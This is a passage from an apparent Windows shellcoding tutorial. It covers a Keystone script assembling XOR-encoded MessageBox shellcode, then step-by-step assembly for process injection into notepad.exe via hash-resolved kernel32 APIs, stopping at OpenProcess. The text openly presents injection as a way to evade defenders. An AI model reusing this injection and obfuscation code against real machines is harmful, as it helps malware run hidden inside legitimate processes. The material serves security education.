    "   cdq                             ;"
    "   cld                             ;"

    " compute_hash_again:                "
    "   lodsb                           ;"
    "   test  al, al                    ;"
    "   jz    compute_hash_finished     ;"
    "   ror   edx, 0x0d                 ;"
    "   add   edx, eax                  ;"
    "   jmp   compute_hash_again        ;"

    " compute_hash_finished:             "

    " find_function_compare:             "
    "   cmp   edx, [esp+0x24]           ;"
    "   jnz   find_function_loop        ;"
    "   mov   edx, [edi+0x24]           ;"
    "   add   edx, ebx                  ;"
    "   mov   cx,  [edx+2*ecx]          ;"
    "   mov   edx, [edi+0x1c]           ;"
    "   add   edx, ebx                  ;"
    "   mov   eax, [edx+4*ecx]          ;"
    "   add   eax, ebx                  ;"
    "   mov   [esp+0x1c], eax           ;"

    " find_function_finished:            "
    "   popad                           ;"
    "   ret                             ;"

    " resolve_symbols_kernel32:          "
    "   push  0x78b5b983                ;"  #   TerminateProcess
    "   call dword ptr [ebp+0x04]       ;"
    "   mov   [ebp+0x10], eax           ;"
    "   push  0xec0e4e8e                ;"  #   LoadLibraryA
    "   call dword ptr [ebp+0x04]       ;"
    "   mov   [ebp+0x14], eax           ;"

    " load_user32:                       "
    "   xor   eax, eax                  ;"
    "   mov   ax, 0x6c6c                ;"  #   "ll"
    "   push  eax                       ;"
    "   push  0x642e3233                ;"  #   "32.d"
    "   push  0x72657375                ;"  #   "user"
    "   mov   esi, esp                  ;"
    "   push  esi                       ;"
    "   call  dword ptr [ebp+0x14]      ;"  #   LoadLibraryA("user32.dll")

    " resolve_symbols_User32:            "
    "   mov   ebx, eax                  ;"
    "   push  0xbc4da2a8                ;"  #   MessageBoxA
    "   call dword ptr [ebp+0x04]       ;"
    "   mov  dword ptr [ebp+0x18], eax  ;"

    " decode_remo:                       "
    "   xor   eax, eax                  ;"
    "   push  eax                       ;"  #   Null terminator
    "   push  0xC5C7CFD8                ;"  #   Encoded "remo" (XOR 0xAA)
    "   mov   esi, esp                  ;"
    "   xor   ecx, ecx                  ;"
    "   mov   cl, 0x04                  ;"  #   4 bytes to decode

    " decode_loop:                       "
    "   xor   byte ptr [esi], 0xAA      ;"  #   XOR with key
    "   inc   esi                       ;"
    "   loop  decode_loop               ;"
    "   mov   esi, esp                  ;"  #   Reset to decoded string

    "   xor  ebx, ebx                   ;"
    "   push ebx                        ;"  #   uType = MB_OK
    "   push esi                        ;"  #   lpCaption = "remo"
    "   push esi                        ;"  #   lpText = "remo"
    "   push ebx                        ;"  #   hWnd = NULL
    "   call dword ptr [ebp+0x18]       ;"  #   MessageBoxA

    " call_terminateprocess:             "
    "   xor   eax, eax                  ;"
    "   push  eax                       ;"  #   uExitCode = 0
    "   dec   eax                       ;"  #   EAX = -1
    "   push  eax                       ;"  #   hProcess = current process
    "   call  dword ptr [ebp+0x10]      ;"  #   TerminateProcess(-1, 0)
)

ks = Ks(KS_ARCH_X86, KS_MODE_32)
encoding, count = ks.asm(CODE)
print("Encoded %d instructions..." % count)

shellcode = bytes(encoding)
shellcode_str = ''.join(f'\\x{b:02x}' for b in shellcode)
print(f"[+] Generated Shellcode: {shellcode_str}")
print(f"[+] Shellcode length: {len(shellcode)} bytes")
```

### PoC Video

The following video demonstrates the XOR-encoded shellcode decoding the string at runtime and displaying it in a MessageBox:

<div align="center">
  <video width="720" controls>
    <source src="/assets/video/shellcoding/xor-encoding-poc.mp4" type="video/mp4">
    Your browser does not support the video tag.
  </video>
</div>

*Video: XOR encoding shellcode decoding "remo" at runtime*

---

## 15. Process Injection: Running In Another Process

Process injection is the art of running shellcode inside another process's address space. Instead of spawning a new `cmd.exe`, we find a running process (in this case `notepad.exe`), allocate memory inside it, write our payload there, and create a remote thread to execute it.

This technique is powerful for evasion -- the payload runs under a legitimate process name, making it harder for defenders to spot malicious activity.

### Step 1: Resolving kernel32.dll Functions

This shellcode resolves **ten** functions from `kernel32.dll` -- the most of any shellcode in this series:

| Function | Hash | Stack Offset | Purpose |
|----------|------|-------------|---------|
| TerminateProcess | `0x78b5b983` | `[ebp+0x18]` | Process termination |
| LoadLibraryA | `0xec0e4e8e` | `[ebp+0x1C]` | Load DLLs |
| ExitProcess | `0x73e2d87e` | `[ebp+0x20]` | Clean exit |
| CreateToolhelp32Snapshot | `0xe454dfed` | `[ebp+0x24]` | Snapshot running processes |
| Process32First | `0x3249baa7` | `[ebp+0x28]` | First process entry |
| Process32Next | `0x4776654a` | `[ebp+0x2C]` | Next process entry |
| OpenProcess | `0xefe297c0` | `[ebp+0x30]` | Get process handle |
| VirtualAllocEx | `0x6e1a959c` | `[ebp+0x34]` | Remote memory allocation |
| WriteProcessMemory | `0xd83d6aa1` | `[ebp+0x38]` | Write to remote process |
| CreateRemoteThread | `0x72bd9cdd` | `[ebp+0x3C]` | Execute in remote process |

```nasm
resolve_symbols_kernel32:
    push  0x78b5b983              ; TerminateProcess
    call  dword ptr [ebp+0x04]
    mov   [ebp+0x18], eax
    push  0xec0e4e8e              ; LoadLibraryA
    call  dword ptr [ebp+0x04]
    mov   [ebp+0x1C], eax
    push  0x73e2d87e              ; ExitProcess
    call  dword ptr [ebp+0x04]
    mov   [ebp+0x20], eax
    push  0xe454dfed              ; CreateToolhelp32Snapshot
    call  dword ptr [ebp+0x04]
    mov   [ebp+0x24], eax
    push  0x3249baa7              ; Process32First
    call  dword ptr [ebp+0x04]
    mov   [ebp+0x28], eax
    push  0x4776654a              ; Process32Next
    call  dword ptr [ebp+0x04]
    mov   [ebp+0x2C], eax
    push  0xefe297c0              ; OpenProcess
    call  dword ptr [ebp+0x04]
    mov   [ebp+0x30], eax
    push  0x6e1a959c              ; VirtualAllocEx
    call  dword ptr [ebp+0x04]
    mov   [ebp+0x34], eax
    push  0xd83d6aa1              ; WriteProcessMemory
    call  dword ptr [ebp+0x04]
    mov   [ebp+0x38], eax
    push  0x72bd9cdd              ; CreateRemoteThread
    call  dword ptr [ebp+0x04]
    mov   [ebp+0x3C], eax
```

<div align="center"><svg viewBox="0 0 750 380" width="750" xmlns="http://www.w3.org/2000/svg" style="font-family: 'Segoe UI', Consolas, monospace;">
  <defs>
    <linearGradient id="bg_s1503" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="#0a0e17"/><stop offset="100%" stop-color="#111827"/></linearGradient>
    <filter id="glow_s1503"><feGaussianBlur stdDeviation="2" result="blur"/><feMerge><feMergeNode in="blur"/><feMergeNode in="SourceGraphic"/></feMerge></filter>
    <linearGradient id="line_s1503" x1="0" y1="0" x2="1" y2="0"><stop offset="0%" stop-color="#00d4ff" stop-opacity="0"/><stop offset="50%" stop-color="#00ff88" stop-opacity="0.5"/><stop offset="100%" stop-color="#00d4ff" stop-opacity="0"/></linearGradient>
  </defs>
  <rect width="750" height="380" rx="10" fill="url(#bg_s1503)"/>
  <rect x="50" y="2" width="650" height="1" rx="1" fill="url(#line_s1503)"/>
  <text x="375" y="28" text-anchor="middle" fill="#e0e7ff" font-size="15" filter="url(#glow_s1503)" font-weight="bold">Resolving 10 kernel32.dll Functions</text>
  <text x="375" y="48" text-anchor="middle" fill="#8b949e" font-size="11">Each hash is pushed → find_function resolves it → address stored at [ebp+offset]</text>

  <rect x="40" y="62" width="160" height="30" rx="4" fill="#151b28" stroke="#00d4ff" stroke-width="1.5"/>
  <text x="120" y="82" text-anchor="middle" fill="#00d4ff" font-size="10" font-weight="bold">Function</text>
  <rect x="210" y="62" width="150" height="30" rx="4" fill="#151b28" stroke="#ff6b35" stroke-width="1.5"/>
  <text x="285" y="82" text-anchor="middle" fill="#ff6b35" font-size="10" font-weight="bold">ROR-13 Hash</text>
  <rect x="370" y="62" width="100" height="30" rx="4" fill="#151b28" stroke="#00ff88" stroke-width="1.5"/>
  <text x="420" y="82" text-anchor="middle" fill="#00ff88" font-size="10" font-weight="bold">Stack Slot</text>
  <rect x="480" y="62" width="230" height="30" rx="4" fill="#151b28" stroke="#8b949e" stroke-width="1"/>
  <text x="595" y="82" text-anchor="middle" fill="#8b949e" font-size="10" font-weight="bold">Purpose</text>

  <text x="120" y="112" text-anchor="middle" fill="#e0e7ff" font-size="10">TerminateProcess</text>
  <text x="285" y="112" text-anchor="middle" fill="#ff6b35" font-size="10">0x78b5b983</text>
  <text x="420" y="112" text-anchor="middle" fill="#00ff88" font-size="10">[ebp+0x18]</text>
  <text x="595" y="112" text-anchor="middle" fill="#8b949e" font-size="9">Kill process</text>

  <text x="120" y="132" text-anchor="middle" fill="#e0e7ff" font-size="10">LoadLibraryA</text>
  <text x="285" y="132" text-anchor="middle" fill="#ff6b35" font-size="10">0xec0e4e8e</text>
  <text x="420" y="132" text-anchor="middle" fill="#00ff88" font-size="10">[ebp+0x1C]</text>
  <text x="595" y="132" text-anchor="middle" fill="#8b949e" font-size="9">Load DLLs</text>

  <text x="120" y="152" text-anchor="middle" fill="#e0e7ff" font-size="10">ExitProcess</text>
  <text x="285" y="152" text-anchor="middle" fill="#ff6b35" font-size="10">0x73e2d87e</text>
  <text x="420" y="152" text-anchor="middle" fill="#00ff88" font-size="10">[ebp+0x20]</text>
  <text x="595" y="152" text-anchor="middle" fill="#8b949e" font-size="9">Clean exit</text>

  <text x="120" y="172" text-anchor="middle" fill="#e0e7ff" font-size="10">CreateToolhelp32Snapshot</text>
  <text x="285" y="172" text-anchor="middle" fill="#ff6b35" font-size="10">0xe454dfed</text>
  <text x="420" y="172" text-anchor="middle" fill="#00ff88" font-size="10">[ebp+0x24]</text>
  <text x="595" y="172" text-anchor="middle" fill="#8b949e" font-size="9">Process snapshot</text>

  <text x="120" y="192" text-anchor="middle" fill="#e0e7ff" font-size="10">Process32First</text>
  <text x="285" y="192" text-anchor="middle" fill="#ff6b35" font-size="10">0x3249baa7</text>
  <text x="420" y="192" text-anchor="middle" fill="#00ff88" font-size="10">[ebp+0x28]</text>
  <text x="595" y="192" text-anchor="middle" fill="#8b949e" font-size="9">First process entry</text>

  <text x="120" y="212" text-anchor="middle" fill="#e0e7ff" font-size="10">Process32Next</text>
  <text x="285" y="212" text-anchor="middle" fill="#ff6b35" font-size="10">0x4776654a</text>
  <text x="420" y="212" text-anchor="middle" fill="#00ff88" font-size="10">[ebp+0x2C]</text>
  <text x="595" y="212" text-anchor="middle" fill="#8b949e" font-size="9">Next process entry</text>

  <text x="120" y="232" text-anchor="middle" fill="#e0e7ff" font-size="10">OpenProcess</text>
  <text x="285" y="232" text-anchor="middle" fill="#ff6b35" font-size="10">0xefe297c0</text>
  <text x="420" y="232" text-anchor="middle" fill="#00ff88" font-size="10">[ebp+0x30]</text>
  <text x="595" y="232" text-anchor="middle" fill="#8b949e" font-size="9">Open target process</text>

  <text x="120" y="252" text-anchor="middle" fill="#e0e7ff" font-size="10">VirtualAllocEx</text>
  <text x="285" y="252" text-anchor="middle" fill="#ff6b35" font-size="10">0x6e1a959c</text>
  <text x="420" y="252" text-anchor="middle" fill="#00ff88" font-size="10">[ebp+0x34]</text>
  <text x="595" y="252" text-anchor="middle" fill="#8b949e" font-size="9">Remote memory alloc</text>

  <text x="120" y="272" text-anchor="middle" fill="#e0e7ff" font-size="10">WriteProcessMemory</text>
  <text x="285" y="272" text-anchor="middle" fill="#ff6b35" font-size="10">0xd83d6aa1</text>
  <text x="420" y="272" text-anchor="middle" fill="#00ff88" font-size="10">[ebp+0x38]</text>
  <text x="595" y="272" text-anchor="middle" fill="#8b949e" font-size="9">Write to remote proc</text>

  <text x="120" y="292" text-anchor="middle" fill="#e0e7ff" font-size="10">CreateRemoteThread</text>
  <text x="285" y="292" text-anchor="middle" fill="#ff6b35" font-size="10">0x72bd9cdd</text>
  <text x="420" y="292" text-anchor="middle" fill="#00ff88" font-size="10">[ebp+0x3C]</text>
  <text x="595" y="292" text-anchor="middle" fill="#8b949e" font-size="9">Execute in remote proc</text>

  <rect x="40" y="310" width="670" height="55" rx="6" fill="#151b28" stroke="#00d4ff" stroke-width="1" stroke-dasharray="4,3"/>
  <text x="375" y="332" text-anchor="middle" fill="#e0e7ff" font-size="11" font-weight="bold">Pattern: push hash → call [ebp+0x04] → mov [ebp+offset], eax</text>
  <text x="375" y="352" text-anchor="middle" fill="#8b949e" font-size="10">find_function uses ROR-13 hashing against kernel32's export table to resolve each API address</text>
</svg></div>

*The injector resolves ten kernel32 functions via ROR-13 hash lookup. Each resolved address is stored at a known offset from EBP for later use.*

### Step 2: CreateToolhelp32Snapshot

`HANDLE CreateToolhelp32Snapshot(DWORD dwFlags, DWORD th32ProcessID)` takes a snapshot of all running processes. We pass `TH32CS_SNAPPROCESS` (2) to enumerate process entries:

```nasm
call_CreateToolhelp32Snapshot:
    xor   eax, eax
    xor   edx, edx
    inc   edx
    inc   edx                     ; EDX = 2 (TH32CS_SNAPPROCESS)
    push  eax                     ; th32ProcessID = 0 (all processes)
    push  edx                     ; dwFlags = TH32CS_SNAPPROCESS
    call  dword ptr [ebp+0x24]   ; CreateToolhelp32Snapshot(2, 0)
```

<div align="center"><svg viewBox="0 0 750 220" width="750" xmlns="http://www.w3.org/2000/svg" style="font-family: 'Segoe UI', Consolas, monospace;">
  <defs>
    <linearGradient id="bg_s1504" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="#0a0e17"/><stop offset="100%" stop-color="#111827"/></linearGradient>
    <filter id="glow_s1504"><feGaussianBlur stdDeviation="2" result="blur"/><feMerge><feMergeNode in="blur"/><feMergeNode in="SourceGraphic"/></feMerge></filter>
    <linearGradient id="line_s1504" x1="0" y1="0" x2="1" y2="0"><stop offset="0%" stop-color="#00d4ff" stop-opacity="0"/><stop offset="50%" stop-color="#00ff88" stop-opacity="0.5"/><stop offset="100%" stop-color="#00d4ff" stop-opacity="0"/></linearGradient>
    <marker id="arr_s1504" markerWidth="10" markerHeight="7" refX="10" refY="3.5" orient="auto"><polygon points="0 0, 10 3.5, 0 7" fill="#00ff88"/></marker>
  </defs>
  <rect width="750" height="220" rx="10" fill="url(#bg_s1504)"/>
  <rect x="50" y="2" width="650" height="1" rx="1" fill="url(#line_s1504)"/>
  <text x="375" y="28" text-anchor="middle" fill="#e0e7ff" font-size="15" filter="url(#glow_s1504)" font-weight="bold">CreateToolhelp32Snapshot Snapshot All Processes</text>

  <rect x="50" y="50" width="200" height="70" rx="6" fill="#151b28" stroke="#00d4ff" stroke-width="1.5"/>
  <text x="150" y="72" text-anchor="middle" fill="#00d4ff" font-size="11" font-weight="bold">Build Value 2</text>
  <text x="150" y="90" text-anchor="middle" fill="#e0e7ff" font-size="10">xor edx, edx</text>
  <text x="150" y="106" text-anchor="middle" fill="#e0e7ff" font-size="10">inc edx; inc edx → 2</text>

  <line x1="250" y1="85" x2="280" y2="85" stroke="#00ff88" stroke-width="1.5" marker-end="url(#arr_s1504)"/>

  <rect x="285" y="45" width="200" height="80" rx="6" fill="#151b28" stroke="#ff6b35" stroke-width="1.5"/>
  <text x="385" y="68" text-anchor="middle" fill="#ff6b35" font-size="11" font-weight="bold">Push Arguments</text>
  <text x="385" y="88" text-anchor="middle" fill="#e0e7ff" font-size="10">push 0 (th32ProcessID)</text>
  <text x="385" y="106" text-anchor="middle" fill="#e0e7ff" font-size="10">push 2 (TH32CS_SNAPPROCESS)</text>
  <text x="385" y="120" text-anchor="middle" fill="#8b949e" font-size="9">stdcall: right-to-left</text>

  <line x1="485" y1="85" x2="515" y2="85" stroke="#00ff88" stroke-width="1.5" marker-end="url(#arr_s1504)"/>

  <rect x="520" y="50" width="190" height="70" rx="6" fill="#151b28" stroke="#00ff88" stroke-width="2"/>
  <text x="615" y="72" text-anchor="middle" fill="#00ff88" font-size="11" font-weight="bold">call [ebp+0x24]</text>
  <text x="615" y="92" text-anchor="middle" fill="#e0e7ff" font-size="10">CreateToolhelp32Snapshot</text>
  <text x="615" y="108" text-anchor="middle" fill="#8b949e" font-size="9">Returns: HANDLE in EAX</text>

  <rect x="50" y="145" width="660" height="55" rx="6" fill="#151b28" stroke="#8b949e" stroke-width="1" stroke-dasharray="4,3"/>
  <text x="375" y="168" text-anchor="middle" fill="#e0e7ff" font-size="11" font-weight="bold">Why inc+inc instead of mov edx, 2?</text>
  <text x="375" y="188" text-anchor="middle" fill="#8b949e" font-size="10">mov edx, 0x00000002 encodes as B8 02 00 00 00 three null bytes. Two inc instructions avoid them entirely.</text>
</svg></div>

*CreateToolhelp32Snapshot with TH32CS_SNAPPROCESS (2) captures every running process. The return handle is used by Process32First/Next to iterate entries.*

> The value `2` is built with two `inc` instructions instead of `mov edx, 2` to avoid null bytes in the opcode.

### Step 3: Process32First and Process Enumeration

We allocate a `PROCESSENTRY32` structure (296 bytes = `0x128`) on the stack and call `Process32First` to get the first entry:

```nasm
call_Process32First:
    mov   [ebp+0x40], eax        ; save hSnapshot
    xor   ecx, ecx
    mov   cx, 0x0128              ; PROCESSENTRY32 size = 296
    sub   esp, ecx                ; allocate on stack
    mov   edi, esp                ; EDI = &PROCESSENTRY32
    mov   dword ptr [edi], ecx   ; pe.dwSize = 296
    push  edi                     ; &pe
    push  dword ptr [ebp+0x40]  ; hSnapshot
    call  dword ptr [ebp+0x28]   ; Process32First(hSnap, &pe)
```

<div align="center"><svg viewBox="0 0 750 280" width="750" xmlns="http://www.w3.org/2000/svg" style="font-family: 'Segoe UI', Consolas, monospace;">
  <defs>
    <linearGradient id="bg_s1505" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="#0a0e17"/><stop offset="100%" stop-color="#111827"/></linearGradient>
    <filter id="glow_s1505"><feGaussianBlur stdDeviation="2" result="blur"/><feMerge><feMergeNode in="blur"/><feMergeNode in="SourceGraphic"/></feMerge></filter>
    <linearGradient id="line_s1505" x1="0" y1="0" x2="1" y2="0"><stop offset="0%" stop-color="#00d4ff" stop-opacity="0"/><stop offset="50%" stop-color="#00ff88" stop-opacity="0.5"/><stop offset="100%" stop-color="#00d4ff" stop-opacity="0"/></linearGradient>
    <marker id="arr_s1505" markerWidth="10" markerHeight="7" refX="10" refY="3.5" orient="auto"><polygon points="0 0, 10 3.5, 0 7" fill="#00ff88"/></marker>
  </defs>
  <rect width="750" height="280" rx="10" fill="url(#bg_s1505)"/>
  <rect x="50" y="2" width="650" height="1" rx="1" fill="url(#line_s1505)"/>
  <text x="375" y="28" text-anchor="middle" fill="#e0e7ff" font-size="15" filter="url(#glow_s1505)" font-weight="bold">Process32First PROCESSENTRY32 Setup</text>

  <rect x="50" y="50" width="300" height="100" rx="6" fill="#151b28" stroke="#00d4ff" stroke-width="1.5"/>
  <text x="200" y="72" text-anchor="middle" fill="#00d4ff" font-size="11" font-weight="bold">Stack Allocation</text>
  <text x="70" y="92" fill="#e0e7ff" font-size="10">mov cx, 0x0128  → size = 296 bytes</text>
  <text x="70" y="110" fill="#e0e7ff" font-size="10">sub esp, ecx    → allocate on stack</text>
  <text x="70" y="128" fill="#e0e7ff" font-size="10">mov edi, esp    → EDI points to struct</text>
  <text x="70" y="143" fill="#8b949e" font-size="9">dwSize field set to 296 as required by API</text>

  <line x1="350" y1="100" x2="380" y2="100" stroke="#00ff88" stroke-width="1.5" marker-end="url(#arr_s1505)"/>

  <rect x="385" y="45" width="320" height="115" rx="6" fill="#151b28" stroke="#ff6b35" stroke-width="1.5"/>
  <text x="545" y="68" text-anchor="middle" fill="#ff6b35" font-size="11" font-weight="bold">PROCESSENTRY32 Layout</text>
  <text x="405" y="88" fill="#e0e7ff" font-size="9">+0x00: dwSize (296)</text>
  <text x="405" y="104" fill="#e0e7ff" font-size="9">+0x04: cntUsage</text>
  <text x="405" y="120" fill="#00ff88" font-size="9" font-weight="bold">+0x08: th32ProcessID  ← PID here</text>
  <text x="405" y="136" fill="#e0e7ff" font-size="9">+0x14: cntThreads</text>
  <text x="405" y="152" fill="#00d4ff" font-size="9" font-weight="bold">+0x24: szExeFile[260]  ← name here</text>

  <rect x="50" y="175" width="655" height="85" rx="6" fill="#151b28" stroke="#00ff88" stroke-width="1.5"/>
  <text x="375" y="198" text-anchor="middle" fill="#00ff88" font-size="11" font-weight="bold">Process32First(hSnapshot, &pe)</text>
  <text x="375" y="218" text-anchor="middle" fill="#e0e7ff" font-size="10">push edi                    → pointer to PROCESSENTRY32</text>
  <text x="375" y="236" text-anchor="middle" fill="#e0e7ff" font-size="10">push dword ptr [ebp+0x40]   → saved hSnapshot handle</text>
  <text x="375" y="254" text-anchor="middle" fill="#8b949e" font-size="9">On success: pe is filled with the first process entry. We then check szExeFile for "notepad.exe"</text>
</svg></div>

*A 296-byte PROCESSENTRY32 is stack-allocated and passed to Process32First. The PID lives at offset +0x08 and the process name at +0x24.*

### Step 4: Finding notepad.exe

The process name sits at offset `0x24` in `PROCESSENTRY32` (`szExeFile`). We match `"notepad.exe"` by comparing three DWORDs:

```nasm
find_process:
    cmp   dword ptr [edi+0x24], 0x65746f6e  ; "note"
    jne   next_process
    cmp   dword ptr [edi+0x28], 0x2e646170  ; "pad."
    jne   next_process
    ; Build "exe\0" without embedding it directly
    xor   eax, eax
    mov   al, 0x65                ; 'e'
    shl   eax, 0x08
    mov   al, 0x78                ; 'x'
    shl   eax, 0x08
    mov   al, 0x65                ; 'e'  → EAX = 0x00657865
    cmp   dword ptr [edi+0x2c], eax  ; "exe\0"?
    jne   next_process
    jmp   found_explorer          ; MATCH!

next_process:
    push  edi                     ; &pe
    push  dword ptr [ebp+0x40]  ; hSnapshot
    call  dword ptr [ebp+0x2C]   ; Process32Next(hSnap, &pe)
    jmp   find_process            ; check next entry
```

<div align="center"><svg viewBox="0 0 750 260" width="750" xmlns="http://www.w3.org/2000/svg" style="font-family: 'Segoe UI', Consolas, monospace;">
  <defs>
    <linearGradient id="bg_s1501" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="#0a0e17"/><stop offset="100%" stop-color="#111827"/></linearGradient>
    <filter id="glow_s1501"><feGaussianBlur stdDeviation="2" result="blur"/><feMerge><feMergeNode in="blur"/><feMergeNode in="SourceGraphic"/></feMerge></filter>
    <linearGradient id="line_s1501" x1="0" y1="0" x2="1" y2="0"><stop offset="0%" stop-color="#00d4ff" stop-opacity="0"/><stop offset="50%" stop-color="#00ff88" stop-opacity="0.5"/><stop offset="100%" stop-color="#00d4ff" stop-opacity="0"/></linearGradient>
    <marker id="arr_s1501" markerWidth="10" markerHeight="7" refX="10" refY="3.5" orient="auto"><polygon points="0 0, 10 3.5, 0 7" fill="#00ff88"/></marker>
  </defs>
  <rect width="750" height="260" rx="10" fill="url(#bg_s1501)"/>
  <rect x="50" y="2" width="650" height="1" rx="1" fill="url(#line_s1501)"/>
  <text x="375" y="28" text-anchor="middle" fill="#e0e7ff" font-size="15" filter="url(#glow_s1501)" font-weight="bold">Process Name Matching "notepad.exe"</text>

  <text x="50" y="58" fill="#8b949e" font-size="11">PROCESSENTRY32.szExeFile at [edi+0x24]:</text>

  <!-- Memory layout -->
  <rect x="50" y="68" width="80" height="40" rx="4" fill="#151b28" stroke="#00ff88" stroke-width="2"/>
  <text x="90" y="84" text-anchor="middle" fill="#e0e7ff" font-size="10">[edi+0x24]</text>
  <text x="90" y="100" text-anchor="middle" fill="#00ff88" font-size="12" font-weight="bold">"note"</text>

  <rect x="140" y="68" width="80" height="40" rx="4" fill="#151b28" stroke="#00ff88" stroke-width="2"/>
  <text x="180" y="84" text-anchor="middle" fill="#e0e7ff" font-size="10">[edi+0x28]</text>
  <text x="180" y="100" text-anchor="middle" fill="#00ff88" font-size="12" font-weight="bold">"pad."</text>

  <rect x="230" y="68" width="80" height="40" rx="4" fill="#151b28" stroke="#ff6b35" stroke-width="2"/>
  <text x="270" y="84" text-anchor="middle" fill="#e0e7ff" font-size="10">[edi+0x2C]</text>
  <text x="270" y="100" text-anchor="middle" fill="#ff6b35" font-size="12" font-weight="bold">"exe\0"</text>

  <rect x="320" y="68" width="60" height="40" rx="4" fill="#151b28" stroke="#8b949e" stroke-width="1"/>
  <text x="350" y="92" text-anchor="middle" fill="#8b949e" font-size="10">...</text>

  <!-- Hex representation -->
  <text x="50" y="135" fill="#8b949e" font-size="11">Hex (little-endian DWORDs):</text>
  <text x="90" y="155" text-anchor="middle" fill="#00d4ff" font-size="11" font-weight="bold">0x65746f6e</text>
  <text x="180" y="155" text-anchor="middle" fill="#00d4ff" font-size="11" font-weight="bold">0x2e646170</text>
  <text x="270" y="155" text-anchor="middle" fill="#ff6b35" font-size="11" font-weight="bold">0x00657865</text>

  <!-- SHL trick -->
  <rect x="400" y="60" width="320" height="110" rx="6" fill="#151b28" stroke="#ff6b35" stroke-width="1.5"/>
  <text x="560" y="82" text-anchor="middle" fill="#ff6b35" font-size="11" font-weight="bold">Building "exe\0" with SHL</text>
  <text x="420" y="102" fill="#e0e7ff" font-size="10">mov al, 0x65   → EAX = 0x00000065</text>
  <text x="420" y="118" fill="#e0e7ff" font-size="10">shl eax, 0x08  → EAX = 0x00006500</text>
  <text x="420" y="134" fill="#e0e7ff" font-size="10">mov al, 0x78   → EAX = 0x00006578</text>
  <text x="420" y="150" fill="#e0e7ff" font-size="10">shl eax, 0x08  → EAX = 0x00657800</text>
  <text x="420" y="166" fill="#e0e7ff" font-size="10">mov al, 0x65   → EAX = 0x00657865</text>

  <!-- Loop diagram -->
  <rect x="50" y="180" width="670" height="65" rx="6" fill="#151b28" stroke="#00d4ff" stroke-width="1" stroke-dasharray="4,3"/>
  <text x="375" y="200" text-anchor="middle" fill="#e0e7ff" font-size="12" font-weight="bold">Enumeration Loop</text>
  <text x="375" y="220" text-anchor="middle" fill="#e0e7ff" font-size="11">Process32First → compare → no match → Process32Next → compare → ... → match!</text>
  <text x="375" y="238" text-anchor="middle" fill="#8b949e" font-size="10">The PID is extracted from pe.th32ProcessID at [edi+0x08]</text>
</svg></div>

*Figure 15.1 -- Process name matching. The szExeFile string "notepad.exe" is compared as three DWORD values. The final "exe\0" is built with SHL to avoid embedding it as a literal.*

### Step 5: OpenProcess

Once we find `notepad.exe`, we extract its PID and open it with `PROCESS_ALL_ACCESS` (`0x001F0FFF`):

```nasm
found_explorer:
    mov   eax, dword ptr [edi+0x08]  ; EAX = pe.th32ProcessID

call_OpenProcess:
    xor   ecx, ecx
    mov   cl, 0x1F                ; ECX = 0x1F
    shl   ecx, 0x10              ; ECX = 0x001F0000
    mov   cx, 0x0FFF             ; ECX = 0x001F0FFF (PROCESS_ALL_ACCESS)
    xor   ebx, ebx
    push  eax                     ; dwProcessId
    push  ebx                     ; bInheritHandle = FALSE
    push  ecx                     ; dwDesiredAccess = PROCESS_ALL_ACCESS
    call  dword ptr [ebp+0x30]   ; OpenProcess(0x1F0FFF, FALSE, pid)
```

<div align="center"><svg viewBox="0 0 750 240" width="750" xmlns="http://www.w3.org/2000/svg" style="font-family: 'Segoe UI', Consolas, monospace;">
  <defs>
    <linearGradient id="bg_s1506" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="#0a0e17"/><stop offset="100%" stop-color="#111827"/></linearGradient>
    <filter id="glow_s1506"><feGaussianBlur stdDeviation="2" result="blur"/><feMerge><feMergeNode in="blur"/><feMergeNode in="SourceGraphic"/></feMerge></filter>
    <linearGradient id="line_s1506" x1="0" y1="0" x2="1" y2="0"><stop offset="0%" stop-color="#00d4ff" stop-opacity="0"/><stop offset="50%" stop-color="#00ff88" stop-opacity="0.5"/><stop offset="100%" stop-color="#00d4ff" stop-opacity="0"/></linearGradient>
    <marker id="arr_s1506" markerWidth="10" markerHeight="7" refX="10" refY="3.5" orient="auto"><polygon points="0 0, 10 3.5, 0 7" fill="#00ff88"/></marker>
  </defs>
  <rect width="750" height="240" rx="10" fill="url(#bg_s1506)"/>
  <rect x="50" y="2" width="650" height="1" rx="1" fill="url(#line_s1506)"/>
  <text x="375" y="28" text-anchor="middle" fill="#e0e7ff" font-size="15" filter="url(#glow_s1506)" font-weight="bold">OpenProcess Acquire Target Handle</text>

  <rect x="50" y="50" width="280" height="80" rx="6" fill="#151b28" stroke="#ff6b35" stroke-width="1.5"/>
  <text x="190" y="72" text-anchor="middle" fill="#ff6b35" font-size="11" font-weight="bold">Building PROCESS_ALL_ACCESS</text>
  <text x="70" y="92" fill="#e0e7ff" font-size="10">mov cl, 0x1F          → ECX = 0x1F</text>
  <text x="70" y="108" fill="#e0e7ff" font-size="10">shl ecx, 0x10         → ECX = 0x001F0000</text>
  <text x="70" y="124" fill="#e0e7ff" font-size="10">mov cx, 0x0FFF        → ECX = 0x001F0FFF</text>

  <line x1="330" y1="90" x2="360" y2="90" stroke="#00ff88" stroke-width="1.5" marker-end="url(#arr_s1506)"/>

  <rect x="365" y="45" width="340" height="90" rx="6" fill="#151b28" stroke="#00ff88" stroke-width="2"/>
  <text x="535" y="68" text-anchor="middle" fill="#00ff88" font-size="11" font-weight="bold">OpenProcess(0x1F0FFF, FALSE, pid)</text>
  <text x="385" y="90" fill="#e0e7ff" font-size="10">push eax   → dwProcessId (from [edi+0x08])</text>
  <text x="385" y="108" fill="#e0e7ff" font-size="10">push 0     → bInheritHandle = FALSE</text>
  <text x="385" y="126" fill="#e0e7ff" font-size="10">push ecx   → dwDesiredAccess = ALL_ACCESS</text>

  <rect x="50" y="155" width="655" height="65" rx="6" fill="#151b28" stroke="#8b949e" stroke-width="1" stroke-dasharray="4,3"/>
  <text x="375" y="178" text-anchor="middle" fill="#e0e7ff" font-size="11" font-weight="bold">Why PROCESS_ALL_ACCESS (0x001F0FFF)?</text>
  <text x="375" y="198" text-anchor="middle" fill="#8b949e" font-size="10">We need: PROCESS_VM_OPERATION (alloc), PROCESS_VM_WRITE (write), PROCESS_CREATE_THREAD (remote thread).</text>
  <text x="375" y="213" text-anchor="middle" fill="#8b949e" font-size="10">ALL_ACCESS grants all these plus more. Return value in EAX is saved to [ebp+0x44].</text>
</svg></div>

